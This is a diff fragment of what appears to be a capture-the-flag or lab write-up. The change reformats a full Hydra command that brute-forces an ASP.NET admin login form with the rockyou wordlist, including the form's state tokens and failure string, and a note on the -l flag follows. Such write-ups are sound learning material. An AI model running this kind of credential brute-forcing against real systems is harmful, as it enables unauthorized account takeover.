@@ -297,9 +297,8 @@ finished at 2021-10-13 08:06:45
 ```
 <details>
 <summary>http-post-form</summary>
-```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.77.205 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=QdkUg64B42tYPWUjQfzmzAOKW57KiggJLxGOJKfXAiwaNpsWlYKFMw8yvcouRkHuHgPzz%2Bbdd3vZ5G%2BGK3SR2II8755DJ3GFeYxJVYx%2FPnzd6BKxhtPB8NeJ2W0Hld9O%2F9SG0wTx9rcfyKdjMLS15GFtVa3YJFAo8KQk%2BCX2DdFV1YFC8JksmF%2Bfu2dRPYYfUePY%2B2snQ722%2BTUYDnuaRzcrv7oxvYD3a8%2Bdx3%2FBL6A7P4bBuLtCClIeAMhwTX2Vnvaot0Lo%2Bqv%2FZmXvNaAbkaI8vp1NZzLF6fqZrtjBBaGKfgLOtLTd6LtW7HeQV7yt8esaN8PwvvvAH9iMUrezDekrH96VdD5VFSHjydHCe3G2X03a&__EVENTVALIDATION=JkKvmjDYE4fS81rhCUFL2nKNI8Gcz7veV1sHiNtx8BkdxHfiCYDuGx2F%2FCpFndKhbl9XXvwfpnjdo%2FXqUFNqbdfpRPu2drUdlerYQqDoLcb5EvlelMQGHtmBr1VvY9%2F7tSIZ%2BS2OwdDk7DyZ%2FNbrisp1nEoUrss7p2Qx0q7OVX0wo1ra&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in~:F=Login failed" -f
-```
+
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.77.205 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=QdkUg64B42tYPWUjQfzmzAOKW57KiggJLxGOJKfXAiwaNpsWlYKFMw8yvcouRkHuHgPzz%2Bbdd3vZ5G%2BGK3SR2II8755DJ3GFeYxJVYx%2FPnzd6BKxhtPB8NeJ2W0Hld9O%2F9SG0wTx9rcfyKdjMLS15GFtVa3YJFAo8KQk%2BCX2DdFV1YFC8JksmF%2Bfu2dRPYYfUePY%2B2snQ722%2BTUYDnuaRzcrv7oxvYD3a8%2Bdx3%2FBL6A7P4bBuLtCClIeAMhwTX2Vnvaot0Lo%2Bqv%2FZmXvNaAbkaI8vp1NZzLF6fqZrtjBBaGKfgLOtLTd6LtW7HeQV7yt8esaN8PwvvvAH9iMUrezDekrH96VdD5VFSHjydHCe3G2X03a&__EVENTVALIDATION=JkKvmjDYE4fS81rhCUFL2nKNI8Gcz7veV1sHiNtx8BkdxHfiCYDuGx2F%2FCpFndKhbl9XXvwfpnjdo%2FXqUFNqbdfpRPu2drUdlerYQqDoLcb5EvlelMQGHtmBr1VvY9%2F7tSIZ%2BS2OwdDk7DyZ%2FNbrisp1nEoUrss7p2Qx0q7OVX0wo1ra&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in~:F=Login failed" -f`
 </details>
 
 `-l admin`  we are specifying a single username, use `-L` for a username wordlist  
